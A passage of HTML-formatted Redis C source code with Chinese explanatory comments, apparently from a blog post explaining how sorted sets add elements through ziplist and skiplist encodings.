                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 先删再插入 skiplist&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (score !=&lt;span&gt; curscore) {
                    zskiplistNode &lt;/span&gt;*&lt;span&gt;node;
                    serverAssert(zslDelete(zs&lt;/span&gt;-&amp;gt;zsl,curscore,ele,&amp;amp;&lt;span&gt;node));
                    znode &lt;/span&gt;= zslInsert(zs-&amp;gt;zsl,score,node-&amp;gt;&lt;span&gt;ele);
                    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; We reused the node-&amp;gt;ele SDS string, free the node now
                     * since zslInsert created a new one. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
                    node&lt;/span&gt;-&amp;gt;ele =&lt;span&gt; NULL;
                    zslFreeNode(node);
                    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Note that we did not removed the original element from
                     * the hash table representing the sorted set, so we just
                     * update the score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 更新dict中的分数引用&lt;/span&gt;
                    dictGetVal(de) = &amp;amp;znode-&amp;gt;score; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Update score ptr. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
                    server.dirty&lt;/span&gt;++&lt;span&gt;;
                    updated&lt;/span&gt;++&lt;span&gt;;
                }
                processed&lt;/span&gt;++&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;xx) {
                ele &lt;/span&gt;=&lt;span&gt; sdsdup(ele);
                znode &lt;/span&gt;= zslInsert(zs-&amp;gt;&lt;span&gt;zsl,score,ele);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加skiplist的同时，也往 dict 中添加一份数据，因为hash的查找永远是最快的&lt;/span&gt;
                serverAssert(dictAdd(zs-&amp;gt;dict,ele,&amp;amp;znode-&amp;gt;score) ==&lt;span&gt; DICT_OK);
                server.dirty&lt;/span&gt;++&lt;span&gt;;
                added&lt;/span&gt;++&lt;span&gt;;
                processed&lt;/span&gt;++&lt;span&gt;;
            }
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown sorted set encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
    }

reply_to_client:
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (incr) { &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; ZINCRBY or INCR option. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (processed)
            addReplyDouble(c,score);
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            addReply(c,shared.nullbulk);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; { &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; ZADD. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        addReplyLongLong(c,ch &lt;/span&gt;? added+&lt;span&gt;updated : added);
    }

cleanup:
    zfree(scores);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (added ||&lt;span&gt; updated) {
        signalModifiedKey(c&lt;/span&gt;-&amp;gt;&lt;span&gt;db,key);
        notifyKeyspaceEvent(NOTIFY_ZSET,
            incr &lt;/span&gt;? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zincr&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; : &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zadd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, key, c-&amp;gt;db-&amp;gt;&lt;span&gt;id);
    }
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1. 元素比较小的情况下创建 ziplist 型的 zset
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; object.c, 创建ziplist 的zset&lt;/span&gt;
robj *createZsetZiplistObject(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zl =&lt;span&gt; ziplistNew();
    robj &lt;/span&gt;*o =&lt;span&gt; createObject(OBJ_ZSET,zl);
    o&lt;/span&gt;-&amp;gt;encoding =&lt;span&gt; OBJ_ENCODING_ZIPLIST;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; o;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2. 创建通用的 zset 实例
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; object.c&lt;/span&gt;
robj *createZsetObject(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;) {
    zset &lt;/span&gt;*zs = zmalloc(&lt;span&gt;sizeof&lt;/span&gt;(*&lt;span&gt;zs));
    robj &lt;/span&gt;*&lt;span&gt;o;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; zsetDictType 稍有不同&lt;/span&gt;
    zs-&amp;gt;dict = dictCreate(&amp;amp;&lt;span&gt;zsetDictType,NULL);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 首次遇到 skiplist, 咱去瞅瞅是如何创建的&lt;/span&gt;
    zs-&amp;gt;zsl =&lt;span&gt; zslCreate();
    o &lt;/span&gt;=&lt;span&gt; createObject(OBJ_ZSET,zs);
    o&lt;/span&gt;-&amp;gt;encoding =&lt;span&gt; OBJ_ENCODING_SKIPLIST;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; o;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; server.c, zset创建时使用的dict类型，与hash有不同&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Sorted sets hash (note: a skiplist is used in addition to the hash table) &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
dictType zsetDictType &lt;/span&gt;=&lt;span&gt; {
    dictSdsHash,               &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; hash function &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    NULL,                      &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; key dup &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    NULL,                      &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; val dup &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    dictSdsKeyCompare,         &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; key compare &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    NULL,                      &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Note: SDS string shared &amp;amp; freed by skiplist &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    NULL                       &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; val destructor &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
};
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建 skiplist 对象&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Create a new skiplist. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
zskiplist &lt;/span&gt;*zslCreate(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;) {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; j;
    zskiplist &lt;/span&gt;*&lt;span&gt;zsl;

    zsl &lt;/span&gt;= zmalloc(&lt;span&gt;sizeof&lt;/span&gt;(*&lt;span&gt;zsl));
    zsl&lt;/span&gt;-&amp;gt;level = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    zsl&lt;/span&gt;-&amp;gt;length = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建header节点，ZSKIPLIST_MAXLEVEL 32&lt;/span&gt;
    zsl-&amp;gt;header = zslCreateNode(ZSKIPLIST_MAXLEVEL,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,NULL);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化header&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; ZSKIPLIST_MAXLEVEL; j++&lt;span&gt;) {
        zsl&lt;/span&gt;-&amp;gt;header-&amp;gt;level[j].forward =&lt;span&gt; NULL;
        zsl&lt;/span&gt;-&amp;gt;header-&amp;gt;level[j].span = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    }
    zsl&lt;/span&gt;-&amp;gt;header-&amp;gt;backward =&lt;span&gt; NULL;
    zsl&lt;/span&gt;-&amp;gt;tail =&lt;span&gt; NULL;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zsl;
}
&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Create a skiplist node with the specified number of levels.
 * The SDS string 'ele' is referenced by the node after the call. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
zskiplistNode &lt;/span&gt;*zslCreateNode(&lt;span&gt;int&lt;/span&gt; level, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; score, sds ele) {
    zskiplistNode &lt;/span&gt;*zn =&lt;span&gt;
        zmalloc(&lt;/span&gt;&lt;span&gt;sizeof&lt;/span&gt;(*zn)+level*&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zskiplistLevel));
    zn&lt;/span&gt;-&amp;gt;score =&lt;span&gt; score;
    zn&lt;/span&gt;-&amp;gt;ele =&lt;span&gt; ele;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zn;
}


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3. ZIPLIST 编码下的zset添加操作
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.1. 查找是否存在要添加的元素 （确定添加或更新）
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, 查找指定ele&lt;/span&gt;
unsigned &lt;span&gt;char&lt;/span&gt; *zzlFind(unsigned &lt;span&gt;char&lt;/span&gt; *zl, sds ele, &lt;span&gt;double&lt;/span&gt; *&lt;span&gt;score) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr = ziplistIndex(zl,&lt;span&gt;0&lt;/span&gt;), *&lt;span&gt;sptr;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 遍历所有ziplist
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 可见，此时的ziplist并没有表现出有序啊&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt; (eptr !=&lt;span&gt; NULL) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eptr 相当于是 key
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; sptr 相当于score&lt;/span&gt;
        sptr =&lt;span&gt; ziplistNext(zl,eptr);
        serverAssert(sptr &lt;/span&gt;!=&lt;span&gt; NULL);

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ziplistCompare(eptr,(unsigned &lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)ele,sdslen(ele))) {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Matching element, pull out score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 找到相应的 key 后，解析下一值，即 score&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (score != NULL) *score =&lt;span&gt; zzlGetScore(sptr);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; eptr;
        }
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Move to next element. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 移动两次对象，才会到下一元素(因为存储是 key-score 相邻存储)&lt;/span&gt;
        eptr =&lt;span&gt; ziplistNext(zl,sptr);
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, 获取元素的score&lt;/span&gt;
&lt;span&gt;double&lt;/span&gt; zzlGetScore(unsigned &lt;span&gt;char&lt;/span&gt; *&lt;span&gt;sptr) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;vstr;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; vlen;
    &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; &lt;span&gt;long&lt;/span&gt;&lt;span&gt; vlong;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; buf[&lt;span&gt;128&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;

    serverAssert(sptr &lt;/span&gt;!=&lt;span&gt; NULL);
    serverAssert(ziplistGet(sptr,&lt;/span&gt;&amp;amp;vstr,&amp;amp;vlen,&amp;amp;&lt;span&gt;vlong));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 带小数点不带小数点&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (vstr) {
        memcpy(buf,vstr,vlen);
        buf[vlen] &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 做类型转换&lt;/span&gt;
        score =&lt;span&gt; strtod(buf,NULL);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        score &lt;/span&gt;=&lt;span&gt; vlong;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; score;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.2. 元素更新操作，先删再插入
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Delete (element,score) pair from ziplist. Use local copy of eptr because we
 * don't want to modify the one given as argument. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zzlDelete(unsigned &lt;span&gt;char&lt;/span&gt; *zl, unsigned &lt;span&gt;char&lt;/span&gt; *&lt;span&gt;eptr) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *p =&lt;span&gt; eptr;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; TODO: add function to ziplist API to delete N elements from offset. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    zl &lt;/span&gt;= ziplistDelete(zl,&amp;amp;&lt;span&gt;p);
    zl &lt;/span&gt;= ziplistDelete(zl,&amp;amp;&lt;span&gt;p);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zl;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加 ele-score 到 ziplist 中&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Insert (element,score) pair in ziplist. This function assumes the element is
 * not yet present in the list. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zzlInsert(unsigned &lt;span&gt;char&lt;/span&gt; *zl, sds ele, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; score) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr = ziplistIndex(zl,&lt;span&gt;0&lt;/span&gt;), *&lt;span&gt;sptr;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; s;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在上面查找时，我们看到ziplist也是遍历，以为是无序的ziplist
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然而实际上，插入时是维护了顺序的哟&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt; (eptr !=&lt;span&gt; NULL) {
        sptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,eptr);
        serverAssert(sptr &lt;/span&gt;!=&lt;span&gt; NULL);
        s &lt;/span&gt;=&lt;span&gt; zzlGetScore(sptr);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 找到第一个比score大的位置，在其前面插入 ele-score&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (s &amp;gt;&lt;span&gt; score) {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; First element with score larger than score for element to be
             * inserted. This means we should take its spot in the list to
             * maintain ordering. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
            zl &lt;/span&gt;=&lt;span&gt; zzlInsertAt(zl,eptr,ele,score);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (s ==&lt;span&gt; score) {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Ensure lexicographical ordering for elements. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当分数相同时，按字典顺序排列&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (zzlCompareElements(eptr,(unsigned &lt;span&gt;char&lt;/span&gt;*)ele,sdslen(ele)) &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
                zl &lt;/span&gt;=&lt;span&gt; zzlInsertAt(zl,eptr,ele,score);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            }
        }

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Move to next element. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        eptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,sptr);
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Push on tail of list when it was not yet inserted. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 以上遍历完成都没有找到相应位置，说明当前score是最大值，将其插入尾部&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (eptr ==&lt;span&gt; NULL)
        zl &lt;/span&gt;=&lt;span&gt; zzlInsertAt(zl,NULL,ele,score);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zl;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在eptr的前面插入 ele-score&lt;/span&gt;
unsigned &lt;span&gt;char&lt;/span&gt; *zzlInsertAt(unsigned &lt;span&gt;char&lt;/span&gt; *zl, unsigned &lt;span&gt;char&lt;/span&gt; *eptr, sds ele, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; score) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;sptr;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; scorebuf[&lt;span&gt;128&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; scorelen;
    size_t offset;

    scorelen &lt;/span&gt;= d2string(scorebuf,&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(scorebuf),score);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (eptr ==&lt;span&gt; NULL) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 直接插入到尾部&lt;/span&gt;
        zl = ziplistPush(zl,(unsigned &lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)ele,sdslen(ele),ZIPLIST_TAIL);
        zl &lt;/span&gt;= ziplistPush(zl,(unsigned &lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)scorebuf,scorelen,ZIPLIST_TAIL);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Keep offset relative to zl, as it might be re-allocated. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        offset &lt;/span&gt;= eptr-&lt;span&gt;zl;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 直接在 eptr 位置添加 ele, 其他元素后移&lt;/span&gt;
        zl = ziplistInsert(zl,eptr,(unsigned &lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)ele,sdslen(ele));
        eptr &lt;/span&gt;= zl+&lt;span&gt;offset;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Insert score after the element. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此时的 eptr 已经插入ele之后的位置，后移一位后，就可以找到 score 的存储位置&lt;/span&gt;
        serverAssert((sptr = ziplistNext(zl,eptr)) !=&lt;span&gt; NULL);
        zl &lt;/span&gt;= ziplistInsert(zl,sptr,(unsigned &lt;span&gt;char&lt;/span&gt;*&lt;span&gt;)scorebuf,scorelen);
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zl;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 4. skiplist 下的zset元素添加
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 4.1. 添加元素
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, 添加 ele-score 到 skiplist 中&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Insert a new node in the skiplist. Assumes the element does not already
 * exist (up to the caller to enforce that). The skiplist takes ownership
 * of the passed SDS string 'ele'. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
zskiplistNode &lt;/span&gt;*zslInsert(zskiplist *zsl, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; score, sds ele) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ZSKIPLIST_MAXLEVEL 32&lt;/span&gt;
    zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *&lt;span&gt;x;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; rank[ZSKIPLIST_MAXLEVEL];
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i, level;

    serverAssert(&lt;/span&gt;!&lt;span&gt;isnan(score));
    x &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;header;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始 zsl-&amp;gt;level = 1
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从header的最高层开始遍历&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span&gt;0&lt;/span&gt;; i--&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; store rank that is crossed to reach the insert position &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 计算出每层可以插入的位置&lt;/span&gt;
        rank[i] = i == (zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;) ? &lt;span&gt;0&lt;/span&gt; : rank[i+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当前level的score小于需要添加的元素时，往前推进skiplist&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (x-&amp;gt;level[i].forward &amp;amp;&amp;amp;&lt;span&gt;
                (x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score &amp;lt; score ||&lt;span&gt;
                    (x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score == score &amp;amp;&amp;amp;&lt;span&gt;
                    sdscmp(x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;ele,ele) &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)))
        {
            rank[i] &lt;/span&gt;+= x-&amp;gt;&lt;span&gt;level[i].span;
            x &lt;/span&gt;= x-&amp;gt;&lt;span&gt;level[i].forward;
        }
        update[i] &lt;/span&gt;=&lt;span&gt; x;
    }
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; we assume the element is not already inside, since we allow duplicated
     * scores, reinserting the same element should never happen since the
     * caller of zslInsert() should test in the hash table if the element is
     * already inside or not. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到一随机的level, 决定要写的节点数
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果当前的level过小，则变更level, 重新初始化大的level&lt;/span&gt;
    level =&lt;span&gt; zslRandomLevel();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (level &amp;gt; zsl-&amp;gt;&lt;span&gt;level) {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = zsl-&amp;gt;level; i &amp;lt; level; i++&lt;span&gt;) {
            rank[i] &lt;/span&gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            update[i] &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;header;
            update[i]&lt;/span&gt;-&amp;gt;level[i].span = zsl-&amp;gt;&lt;span&gt;length;
        }
        zsl&lt;/span&gt;-&amp;gt;level =&lt;span&gt; level;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 构建新的 skiplist 节点，为每一层节点添加同样的数据&lt;/span&gt;
    x =&lt;span&gt; zslCreateNode(level,score,ele);
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; level; i++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 让i层的节点与x关联&lt;/span&gt;
        x-&amp;gt;level[i].forward = update[i]-&amp;gt;&lt;span&gt;level[i].forward;
        update[i]&lt;/span&gt;-&amp;gt;level[i].forward =&lt;span&gt; x;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; update span covered by update[i] as x is inserted here &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        x&lt;/span&gt;-&amp;gt;level[i].span = update[i]-&amp;gt;level[i].span - (rank[&lt;span&gt;0&lt;/span&gt;] -&lt;span&gt; rank[i]);
        update[i]&lt;/span&gt;-&amp;gt;level[i].span = (rank[&lt;span&gt;0&lt;/span&gt;] - rank[i]) + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; increment span for untouched levels &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果当前level较小，则存在有的level未赋值情况，需要主动+1&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = level; i &amp;lt; zsl-&amp;gt;level; i++&lt;span&gt;) {
        update[i]&lt;/span&gt;-&amp;gt;level[i].span++&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关联好header后，设置backward指针&lt;/span&gt;
    x-&amp;gt;backward = (update[&lt;span&gt;0&lt;/span&gt;] == zsl-&amp;gt;header) ? NULL : update[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (x-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward)
        x&lt;/span&gt;-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;].forward-&amp;gt;backward =&lt;span&gt; x;
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同有后继节点，说明是尾节点，赋值tail&lt;/span&gt;
        zsl-&amp;gt;tail =&lt;span&gt; x;
    zsl&lt;/span&gt;-&amp;gt;length++&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; x;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
